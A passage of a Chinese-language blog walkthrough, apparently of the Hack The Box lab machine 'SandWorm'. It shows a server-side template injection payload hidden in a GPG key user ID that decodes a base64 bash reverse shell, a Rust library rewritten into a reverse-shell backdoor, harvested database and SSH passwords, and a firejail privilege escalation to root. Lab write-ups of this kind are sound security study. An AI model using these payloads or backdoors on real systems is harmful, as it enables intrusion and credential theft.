+W9z16aCW6xb2N7nc9MFVwPFxZmFQt69J7dNrSA2mDQadRJPJiZk8DCBP75vCMQIf
+1+eurg87eGcIDEVtvyj+ye625V0k5td6x8IYF0d9l98/0eg1gETPnCKNzWxfpVDN
+ow9rAc/zsClQIMHQruCvwezWPsxrtYkVqvwDg2+FZoNrelz2pz5Ke/FpjW68Us0x
+NbvUx9uzuHcnjRo1em5IClJhLnrv7En4mqnGezaB3agnkfIEE5TfBNvOFrOjAM0s
+GXgQAdzaLsAa+p+DxplBZmv6Up/OYW1m6phrZvVM4hOrDtMBtProxrkBjQRkkbFQ
+AQwAxameMoG9S4gKT71Jr775y42g9qHK4D1pF0XZ25zG7/CzxBnPFHE+MdlKUG+x
+zUncNpJQkKGIY6XCo6WZuKlnC6F+1rUjwiXVxJfx7V6m0XxieyqVGo438Ylk1488
+ST67+gG+o0dfoB/7WYz/oBuJR3PCoatVSuIthJq8+VkaETmsQYk9DrhTDAu9F9hd
+sx2sOkOVuXJsz1azXtSMiaoUcCJE1AvIqPitLbfRTgIVlzJBcblO/RvFmKdA6nyW
+5p9hP6FLI2rRyqsEt1/GsL1LaAEcxZPorL1jG9mYkB5jglzplfPSmwLFJyXIJ5L7
+4dwzAZtHJ6e0cctEoow3yPyptjdJksJG6fa1hhuIQozZkNSp4midWoE/u04WtGJ4
+QgSmxZUtJ23Kecgt/BVZJqVqRDwDadldDDnZnux6whG9Z85R7Jx5d2TYH7xkBbJg
+a+xDWReBprj+h79lqrGQqExz/oquk1jKXr6dLvSzytokFx+6T8QFLRzZRuGyCE3O
+VafrABEBAAGJAbwEGAEKACYWIQR971IPhIahWM7+KB4+8NCzdVoCUgUCZJGxUAIb
+DAUJA8JnAAAKCRA+8NCzdVoCUp2oC/9BFtp2J9e7h3MDSxdAQtu3m9ryg79IxOuA
+SYIw8Nlyt3DtMgLgGT7N6KuAXQYwmu7IWEppDDkt2dykPh+B2QsoRF8Nu79Z3MXb
+UKvgBtvga94GtYuD3/FzS31VRosn/isLle5cJSANz+N/5WsSM70EmCbhZ8dCkj39
+oBoQRWyf5hMHm5oRCmfyg53oR3AftZowkg0bNO/VGBH++qdpT9FUGaBCwrxiRp0o
+o4C1z4qsB+4kyrXumUuKAGROlGVFtCB9986edCOavXHGzvgvtpm8QlO/AUI6i/tP
+kvIO1+uk9eII2FTbxQDP+WYdr1RHlgNsNtzrdrNGFR0ajQlSaMsDqdBDbKRo0g37
+KLTpg1id4jQvQ7Em7buqXMCGA7ZuZ+v7GoUsnBRrMYEFQjVnB+WPOJnduLUiHDSP
+swpiRp7g9GfbnLlxXNqTXrUZy+a+UbfpfSlUSoCEgRvN7nWKtsNLi50qxLKOV1Sz
+myNm8HZYYVAsuR1Od5o5c4NyAKILTg0=
+=uSFb
+-----END PGP PUBLIC KEY BLOCK-----
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# ls
+msg
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# gpg --armor --export {{1*7}}@qq.com  &gt; publicKey
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# ls
+msg  publicKey
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# gpg --clear-sign msg
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# ls
+msg  msg.asc  publicKey
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# cat msg.asc
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+test
+-----BEGIN PGP SIGNATURE-----
+
+iQGzBAEBCgAdFiEEfe9SD4SGoVjO/igePvDQs3VaAlIFAmSRsZEACgkQPvDQs3Va
+AlLDewwAzeKPNfT9nZrggzP9uJcyDcd1aMRoespprYTKq3d8NfS3CCfAdrN3vkCb
+BdBkCCeTjeJ1ket39EKRk3kJZ+zWrWgYFVPmHGan4MiVLY+41ecQ+jlnYaviNVAj
+E6C54sD7AsLtRRDEmeRLkA0GNo2/Zxy6wSr9HY71p6XM+dl0r+eDUNSjwj+uKRHX
+UktBB/xUdglLeBdp/+y8RSGkOmiIUS3KBBc3qzid+OYUqUeT+sVPln2FL03RQ6h2
+VOwoRBpgtOMmKQXnE1ndLS0NdAXeG5tVBM+I6BVjsHhsGlL9iVz9TPK9wuz4L4nN
+w538BFrIzYdnZ2EeaAbgSMdZM9FsVH36r3ezh42E9GAF08tdogiRrJrRGf3aHIwS
+dIw3hbL2skcDwi/qIkm5ed77RKouLmb1qFS8o1gNci+lYQMIyrUdI9ChqaV9Sq+Z
+MTOFOfbPTsOQRf0iyUESCFUovzUH93q1rTU3Y8yvvAhnMxrIuMzj0kgXY2WTUBjQ
+/qRE4kXr
+=SXBu
+-----END PGP SIGNATURE-----
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─#
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687269943532-7fc9252e-81af-40aa-a97d-f412efb8687e.png#averageHue=%23fbfafa&clientId=u10438d13-f564-4&from=paste&height=683&id=u34b05d46&originHeight=854&originWidth=1855&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80980&status=done&style=none&taskId=uf592ea4f-6582-4827-a130-6f3a86d64b7&title=&width=1484" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>分别把刚才的公钥和签名放到相应的位置</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687269955872-56386b5e-67f2-4b24-b5ac-a3eef800f5dd.png#averageHue=%23adadad&clientId=u10438d13-f564-4&from=paste&height=560&id=uf0d96c6b&originHeight=700&originWidth=1246&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106187&status=done&style=none&taskId=u43345f0f-41f6-4791-8b40-f35385e3765&title=&width=996.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>发现这里对我们的 7进行了解析说明这里可以进行ssti注入</p>
+<pre><code class="bash">┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# gpg --edit-key {{1*7}}@qq.com                                      130 ⨯
+gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+
+Secret key is available.
+
+sec  rsa3072/3EF0D0B3755A0252
+     created: 2023-06-20  expires: 2025-06-19  usage: SC
+     trust: ultimate      validity: ultimate
+ssb  rsa3072/572C2905CEB9039C
+     created: 2023-06-20  expires: 2025-06-19  usage: E
+[ultimate] (1)  {{1*7}}@qq.com &lt;{{1*7}}@qq.com&gt;
+gpg&gt; adduid
+Real name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0NDQgMD4mMQo=|base64 -d|bash").read() }}   
+Email address: someb0dy@htb.com
+Comment:
+You selected this USER-ID:
+    &quot;{{ self.__init__.__globals__.__builtins__.__import__('os').popen("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0NDQgMD4mMQo=|base64 -d|bash").read() }} &lt;someb0dy@htb.com&gt;&quot;
+
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? O
+
+sec  rsa3072/3EF0D0B3755A0252
+     created: 2023-06-20  expires: 2025-06-19  usage: SC
+     trust: ultimate      validity: ultimate
+ssb  rsa3072/572C2905CEB9039C
+     created: 2023-06-20  expires: 2025-06-19  usage: E
+[ultimate] (1)  {{1*7}}@qq.com &lt;{{1*7}}@qq.com&gt;
+[ unknown] (2). {{ self.__init__.__globals__.__builtins__.__import__('os').popen("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0NDQgMD4mMQo=|base64 -d|bash").read() }} &lt;someb0dy@htb.com&gt;
+
+gpg&gt; save
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# gpg --clear-sign msg
+File &#39;msg.asc&#39; exists. Overwrite? (y/N) y
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# gpg --armor --export {{1*7}}@qq.com  &gt; publicKey
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# cat msg.asc
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+test
+-----BEGIN PGP SIGNATURE-----
+
+iQGzBAEBCgAdFiEEfe9SD4SGoVjO/igePvDQs3VaAlIFAmSRudoACgkQPvDQs3Va
+AlJblwv/ZTAXFH+eDDv9zuasML0Gkjv1PgLJuPVz49NVq13mv93Ql0jvEQTS0jyA
+z3bMfkxQT7/fM+6qEyJ8OIHrfOC/NFQj1WuLWJ45VadIjsz2ZeVmeLYZvAY5izV5
+54H7WuO9+qr1bnX04NuwqHbqoU+qMYKQACW462vNO7N4siJuFTEex9DeQPqCLudy
+mnZ/6OsZniNApRqW9dbw/RwGnbJpE9WdSJ3N5KpL/ZNTVKTIG80wUSOPGEtkd9O0
+eslPZNk4MfYim2q8sGG3/F5xTk2u+B0+/CVNr76jphOzhwauoXOka4WV4yCOKfS5
+ZhuuklzXbUQ9sgHCDTQFTfXUg1Mhd16K7DdiCf+BHAZDMJk+oXfPqgKPGXPUjvpl
+l7fqHnToR43qZOoryAhXslu0qZmjvGmyqYRzG52DCeTTjQp5l6BPlokE321T9+9y
+8Do6/+1aADfdEj26EaUyCEnIG1NKVs9a3Avwhupn0O8ywpGEx7yT690jX7XyIGUh
+bc1jOEPD
+=j2Zl
+-----END PGP SIGNATURE-----
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/SandWorm/sign]
+└─# cat publicKey
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+
+mQGNBGSRsVABDADPg1tNfZ73JoEo06M3vPrcUMhAjYfe6Rup16w9NWH4WjWmmVkJ
+FsCnNvl/uEAEhaYpNHBaiuvc0H3nVV9GYkd0SHF9uxeNHdEn6HgG/76KHM3Ht/3Y
+WFRlbx98mHcrJdJakhNhvWWE6SUtzvnp2zFanDfWDks1GIEMB9KGkf66AZE9qWcv
+PmogyZsSRTAHcg0Gper0uDoVmrR+zX1NI53gaGzB1JOcPrYKAForn5Dmd1eQScA7
+PKorW1Z4FaEuCEFYQOsN8LmruvUl04LTvFv4crDbfWhhF7RQ0aQbQd4LZJPndBf4
+jbq33eTjIFXIbxnxez8XcGnNyhnm2p6s1FAe4kpC9qYBxYTWY2no1mkV90W3hXuf
+3yWAxAdTn4mxlfiR128CvBVG7sXCYgGORajyKy5Y7kGSQds+S9zst1XN9twrfy37
+varDzuLOZ1aB6Qqt8qqTINLDEeUlpy7B8aTiLPkk4ZbJrbDoGcbO+gXYm9kpEIR3
+/fD8slb3o6hVMO8AEQEAAbQfe3sxKjd9fUBxcS5jb20gPHt7MSo3fX1AcXEuY29t
+PokB1AQTAQoAPhYhBH3vUg+EhqFYzv4oHj7w0LN1WgJSBQJkkbFQAhsDBQkDwmcA
+BQsJCAcCBhUKCQgLAgQWAgMBAh4BAheAAAoJED7w0LN1WgJS2lIMALBz4V3ixkIR
+xYZY37LyEHCcIR4IIkBpAJvFPDkY4E+NP1l8HpBOO1dHegKKmU+RPtHywsjTPdkx
+bjq/Q11Jr3G8fz3DPBSOG9iNutCN/LghhtuUPa7KIRxgjDjEU1sg/zYVSxQkOmKD
+irpN39VL8pFabPRogsaM4VfrN+pobL9mYp/yfqagj65aG5SDJq4jxY8yAIOTk31N
+W9z16aCW6xb2N7nc9MFVwPFxZmFQt69J7dNrSA2mDQadRJPJiZk8DCBP75vCMQIf
+1+eurg87eGcIDEVtvyj+ye625V0k5td6x8IYF0d9l98/0eg1gETPnCKNzWxfpVDN
+ow9rAc/zsClQIMHQruCvwezWPsxrtYkVqvwDg2+FZoNrelz2pz5Ke/FpjW68Us0x
+NbvUx9uzuHcnjRo1em5IClJhLnrv7En4mqnGezaB3agnkfIEE5TfBNvOFrOjAM0s
+GXgQAdzaLsAa+p+DxplBZmv6Up/OYW1m6phrZvVM4hOrDtMBtProxrSte3sgc2Vs
+Zi5fX2luaXRfXy5fX2dsb2JhbHNfXy5fX2J1aWx0aW5zX18uX19pbXBvcnRfXygn
+b3MnKS5wb3BlbigiZWNobyBZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TUM0
+eE1DNHhOaTQyTHpRME5EUWdNRDRtTVFvPXxiYXNlNjQgLWR8YmFzaCIpLnJlYWQo
+KSB9fSA8c29tZWIwZHlAaHRiLmNvbT6JAdQEEwEKAD4WIQR971IPhIahWM7+KB4+
+8NCzdVoCUgUCZJG51AIbAwUJA8JnAAULCQgHAgYVCgkICwIEFgIDAQIeAQIXgAAK
+CRA+8NCzdVoCUiiFC/9KN/l8WzTem/SLdguJPvBkTi7ggZQb3vGu/7thhb00OKtL
+Of944tkCj8VNqEkRFiMBMYT7HbZ+2nibA+AXz84eOAchKmXqGK/ahd4tDgIzSg9C
+0+tHwg3ebbdh7xFKYC87PLb7nWqmrOp1vF+KAkh57iTIkkc6IBBtyWSEE2TvVCm6
+S2hUAyPusLag5xfMHIWUGRL3/hWiucXoXevPbMx1DRZo1+C5xKCHBWVeTg1GmSJN
+aG2CVz2hwv2vRbPs3E84d0M+dnZ42+2L6rnCQrzkULKustg2OdjcWb9kymgtmJjr
+8O1N0bdOvw1f9onoH1Hl25Kj8nxsfoMysChJbCYZ+yckBhFcrVBxsOAifzYZ7Xm4
+ve3OjqOjhcW5J+eR30d4jtxQ4V9XFfQ4pFzt3LJhq5AIAE7iOTCWR1BEah4ILhhf
+dg56bnEV2zJoPENUG5HzsWAfl7YP1J0Q/nJ7Mrhf+E7t28lrPV9RvAo/a2Dgwz5V
+URn5wtV/ehUGfPMv9BG5AY0EZJGxUAEMAMWpnjKBvUuICk+9Sa+++cuNoPahyuA9
+aRdF2ducxu/ws8QZzxRxPjHZSlBvsc1J3DaSUJChiGOlwqOlmbipZwuhfta1I8Il
+1cSX8e1eptF8YnsqlRqON/GJZNePPEk+u/oBvqNHX6Af+1mM/6AbiUdzwqGrVUri
+LYSavPlZGhE5rEGJPQ64UwwLvRfYXbMdrDpDlblybM9Ws17UjImqFHAiRNQLyKj4
+rS230U4CFZcyQXG5Tv0bxZinQOp8luafYT+hSyNq0cqrBLdfxrC9S2gBHMWT6Ky9
+YxvZmJAeY4Jc6ZXz0psCxSclyCeS++HcMwGbRyentHHLRKKMN8j8qbY3SZLCRun2
+tYYbiEKM2ZDUqeJonVqBP7tOFrRieEIEpsWVLSdtynnILfwVWSalakQ8A2nZXQw5
+2Z7sesIRvWfOUeyceXdk2B+8ZAWyYGvsQ1kXgaa4/oe/ZaqxkKhMc/6KrpNYyl6+
+nS70s8raJBcfuk/EBS0c2UbhsghNzlWn6wARAQABiQG8BBgBCgAmFiEEfe9SD4SG
+oVjO/igePvDQs3VaAlIFAmSRsVACGwwFCQPCZwAACgkQPvDQs3VaAlKdqAv/QRba
+difXu4dzA0sXQELbt5va8oO/SMTrgEmCMPDZcrdw7TIC4Bk+zeirgF0GMJruyFhK
+aQw5LdncpD4fgdkLKERfDbu/WdzF21Cr4Abb4GveBrWLg9/xc0t9VUaLJ/4rC5Xu
+XCUgDc/jf+VrEjO9BJgm4WfHQpI9/aAaEEVsn+YTB5uaEQpn8oOd6EdwH7WaMJIN
+GzTv1RgR/vqnaU/RVBmgQsK8YkadKKOAtc+KrAfuJMq17plLigBkTpRlRbQgfffO
+nnQjmr1xxs74L7aZvEJTvwFCOov7T5LyDtfrpPXiCNhU28UAz/lmHa9UR5YDbDbc
+63azRhUdGo0JUmjLA6nQQ2ykaNIN+yi06YNYneI0L0OxJu27qlzAhgO2bmfr+xqF
+LJwUazGBBUI1ZwfljziZ3bi1Ihw0j7MKYkae4PRn25y5cVzak161GcvmvlG36X0p
+VEqAhIEbze51irbDS4udKsSyjldUs5sjZvB2WGFQLLkdTneaOXODcgCiC04N
+=12ny
+-----END PGP PUBLIC KEY BLOCK-----
+
+</code></pre>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>通过这个方式执行命令进行反弹shell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687272004020-93f360c8-a9dc-4803-a723-2218ac7ef05a.png#averageHue=%231a1a1a&clientId=u10438d13-f564-4&from=paste&height=323&id=ud70ed88d&originHeight=404&originWidth=1049&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57489&status=done&style=none&taskId=ud82b9e3f-bbcb-4f7b-a340-9db54cc64af&title=&width=839.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687272043359-596db0cc-f38b-4da0-a029-bfe8781b8387.png#averageHue=%23fefdfd&clientId=u10438d13-f564-4&from=paste&height=493&id=uc87da8a7&originHeight=616&originWidth=1621&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55606&status=done&style=none&taskId=ub4d845dd-b024-4717-bab1-5fd71ed0103&title=&width=1296.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>把上面生成的公钥和签名放到这里</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687272035676-6f9cb6e1-af63-4907-8c4d-d7255b6f4cbc.png#averageHue=%23121212&clientId=u10438d13-f564-4&from=paste&height=702&id=ud55ce24c&originHeight=877&originWidth=1494&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=90717&status=done&style=none&taskId=u161064de-d1f8-4e2e-8444-2f8243632a0&title=&width=1195.2" alt="image.png">shell!!!</p>
+<pre><code class="bash">atlas@sandworm:/var/www/html/SSA/SSA$ cat __in
+cat __init__.py
+from flask import Flask
+from flask_login import LoginManager
+from flask_sqlalchemy import SQLAlchemy
+
+db = SQLAlchemy()
+
+def create_app():
+    app = Flask(__name__)
+
+    app.config[&#39;SECRET_KEY&#39;] = &#39;91668c1bc67132e3dcfb5b1a3e0c5c21&#39;
+    app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] = &#39;mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA&#39;
+
+    db.init_app(app)
+
+    # blueprint for non-auth parts of app
+    from .app import main as main_blueprint
+    app.register_blueprint(main_blueprint)
+
+    login_manager = LoginManager()
+    login_manager.login_view = &quot;main.login&quot;
+    login_manager.init_app(app)
+
+    from .models import User
+    @login_manager.user_loader
+    def load_user(user_id):
+        return User.query.get(int(user_id))
+
+    return app
+</code></pre>
+<p>从web根目录的代码中找到了数据库连接密码</p>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>passwd</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>atlas</td>
+<td>GarlicAndOnionZ42</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>但是没用mysql这个命令- -，估计是在沙箱中好多命令都执行不了</p>
+<p>最后翻home目录下面有一个配置文件</p>
+<pre><code class="bash">/home/atlas/.config/httpie/sessions/localhost_5000
+
+cat admin.json
+{
+    &quot;__meta__&quot;: {
+        &quot;about&quot;: &quot;HTTPie session file&quot;,
+        &quot;help&quot;: &quot;https://httpie.io/docs#sessions&quot;,
+        &quot;httpie&quot;: &quot;2.6.0&quot;
+    },
+    &quot;auth&quot;: {
+        &quot;password&quot;: &quot;quietLiketheWind22&quot;,
+        &quot;type&quot;: null,
+        &quot;username&quot;: &quot;silentobserver&quot;
+    },
+    &quot;cookies&quot;: {
+        &quot;session&quot;: {
+            &quot;expires&quot;: null,
+            &quot;path&quot;: &quot;/&quot;,
+            &quot;secure&quot;: false,
+            &quot;value&quot;: &quot;eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA&quot;
+        }
+    },
+    &quot;headers&quot;: {
+        &quot;Accept&quot;: &quot;application/json, */*;q=0.5&quot;
+    }
+}
+atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ pwd
+pwd
+/home/atlas/.config/httpie/sessions/localhost_5000
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>passwd</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>silentobserver</td>
+<td>quietLiketheWind22</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>ssh 连接成功 user flag 成功获取</p>
+<h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687277075182-92b11da2-a697-4a42-b6f6-3ffff74ea279.png#averageHue=%230e0e0e&clientId=u10438d13-f564-4&from=paste&height=636&id=u539d8aeb&originHeight=795&originWidth=1775&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=194498&status=done&style=none&taskId=u1e646fd1-cdc9-4cab-aa69-4d5a4bd1bd8&title=&width=1420" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687277184051-66f5ba7e-ebf0-419d-8dd1-018391e36ade.png#averageHue=%230f0f0f&clientId=u10438d13-f564-4&from=paste&height=444&id=u31a30930&originHeight=555&originWidth=1881&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=135603&status=done&style=none&taskId=ue09cf29c-54da-4b89-a7b7-bc1e3c9434b&title=&width=1504.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>仔细看到应该是有以root权限启动的计划任务</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>在翻看文件时候&#x2F;opt&#x2F;crates&#x2F;logger&#x2F;src</p>
+<pre><code class="rust">extern crate chrono;
+
+use std::fs::OpenOptions;
+use std::io::Write;
+use chrono::prelude::*;
+
+pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) {
+    let now = Local::now();
+    let timestamp = now.format(&quot;%Y-%m-%d %H:%M:%S&quot;).to_string();
+    let log_message = format!(&quot;[{}] - User: {}, Query: {}, Justification: {}\n&quot;, timestamp, user, query, justification);
+
+    let mut file = match OpenOptions::new().append(true).create(true).open(&quot;/opt/tipnet/access.log&quot;) {
+        Ok(file) =&gt; file,
+        Err(e) =&gt; {
+            println!(&quot;Error opening log file: {}&quot;, e);
+            return;
+        }
+    };
+
+    if let Err(e) = file.write_all(log_message.as_bytes()) {
+        println!(&quot;Error writing to log file: {}&quot;, e);
+    }
+}
+</code></pre>
+<p>这里有一个记录日志文件的rust文件,猜测应该会执行<br>我们对这个文件具有完全的控制权限修改为反弹shell</p>
+<h2 id="RustBackDoor"><a href="#RustBackDoor" class="headerlink" title="RustBackDoor"></a>RustBackDoor</h2><pre><code class="rust">extern crate chrono;
+
+use std::net::TcpStream;
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
+
+pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) {
+    let sock = TcpStream::connect(&quot;&lt;IP attack&gt;:4444&quot;).unwrap();
+    let fd = sock.as_raw_fd();
+    Command::new(&quot;/bin/bash&quot;)
+        .arg(&quot;-i&quot;)
+        .stdin(unsafe { Stdio::from_raw_fd(fd) })
+        .stdout(unsafe { Stdio::from_raw_fd(fd) })
+        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .spawn()
+        .unwrap()
+        .wait()
+        .unwrap();
+}
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687278632201-69070476-d4e6-4dcd-84bb-c6320cd1f477.png#averageHue=%23141414&clientId=u10438d13-f564-4&from=paste&height=756&id=u63bf60c4&originHeight=945&originWidth=950&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97821&status=done&style=none&taskId=u27159ebf-51d7-4a6c-a8eb-5e85ee80c25&title=&width=760" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>修改lib.rs之后稍等一会成功，成功反弹shell,此时的atlas用户是没有沙箱限制的，发现id组多了应该 jailer</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687278681635-9af5b906-1d75-424a-a3db-239027ac8e0b.png#averageHue=%231d1d1d&clientId=u10438d13-f564-4&from=paste&height=155&id=ua0bd625b&originHeight=194&originWidth=880&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27351&status=done&style=none&taskId=uab67ffac-e733-4f73-89b1-051d517f2cf&title=&width=704" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>发现firejail 带有suid</p>
+<p>提权的过程和之前的Cerberus靶机一样<br>Refer:<a href="https://gist.githubusercontent.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25/raw/86058ce12f69997b2de35c5de7bcd3036654f32f/exploit.py" target="_blank" rel="noopener">https://gist.githubusercontent.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25/raw/86058ce12f69997b2de35c5de7bcd3036654f32f/exploit.py</a><br>提权脚本</p>
+<pre><code class="rust">atlas@sandworm:~/someb0dy$ python3 exploit.py
+python3 exploit.py
+/home/atlas/someb0dy/exploit.py needs to have the execute bit set for the exploit to work. Run `chmod +x /home/atlas/someb0dy/exploit.py` and try again.
+atlas@sandworm:~/someb0dy$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
+python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;
+atlas@sandworm:~/someb0dy$ chmod +x
+chmod +x exploit.py
+atlas@sandworm:~/someb0dy$ python3 exploit.py
+python3 exploit.py
+You can now run &#39;firejail --join=239891&#39; in another terminal to obtain a shell where &#39;sudo su -&#39; should grant you a root shell.
+ls
+ls
+
+</code></pre>
+<p>然后在反弹一次shell在另一个终端中输入</p>
+<ol>
+<li>firejail –join&#x3D;239891 </li>
+<li>再接着 su -</li>
+</ol>
+<pre><code class="rust">atlas@sandworm:/opt/tipnet$ firejail --join=239891
+firejail --join=239891
+Warning: cleaning all supplementary groups
+changing root to /proc/239891/root
+Child process initialized in 7.52 ms
+
+su -
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2023-06-25T16:12:50.439Z" itemprop="dateUpdated">2023-06-26 00:12:50</time>
+</span><br>
+
+
+        
+        IF the blog help you a lot ,Buy me a cup of coffee~：<a href="/2023/06/26/SandWorm/" target="_blank" rel="external">someb0dy.github.io/2023/06/26/SandWorm/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="someb0dy.github.io">
+            <img src="/img/avatar.jpg" alt="Someb0dy">
+            Someb0dy
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" target="_blank" rel="noopener" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/gpg-ssti/" rel="tag">gpg,ssti</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=someb0dy.github.io/2023/06/26/SandWorm/&title=《SandWorm》 — Someb0dy's blog&pic=someb0dy.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=someb0dy.github.io/2023/06/26/SandWorm/&title=《SandWorm》 — Someb0dy's blog&source=Always Be Hungry,Be Foolish" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=someb0dy.github.io/2023/06/26/SandWorm/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《SandWorm》 — Someb0dy's blog&url=someb0dy.github.io/2023/06/26/SandWorm/&via=someb0dy.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=someb0dy.github.io/2023/06/26/SandWorm/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
